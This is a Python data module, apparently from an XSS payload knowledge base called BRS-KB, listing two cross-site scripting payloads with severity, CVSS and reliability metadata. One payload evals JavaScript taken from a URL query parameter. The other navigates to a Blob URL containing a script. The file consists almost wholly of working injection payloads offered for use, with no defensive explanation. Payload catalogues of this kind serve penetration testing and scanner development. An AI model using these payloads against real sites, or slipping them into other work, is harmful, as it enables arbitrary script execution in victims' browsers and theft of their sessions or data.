#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

URL API XSS Payloads
"""

from ..models import PayloadEntry


URL_API_PAYLOADS = {
    "url_searchParams": PayloadEntry(
        payload="<script>new URLSearchParams(location.search).get('xss')&&eval(new URLSearchParams(location.search).get('xss'))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="URLSearchParams eval",
        tags=["url", "searchParams", "eval"],
        reliability="high",
    ),
    "url_createObjectURL": PayloadEntry(
        payload="<script>var b=new Blob(['<script>alert(1)<\\/script>'],{type:'text/html'});location=URL.createObjectURL(b)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Blob URL navigation",
        tags=["url", "blob", "createObjectURL"],
        reliability="medium",
    ),
}

URL_API_PAYLOADS_TOTAL = len(URL_API_PAYLOADS)
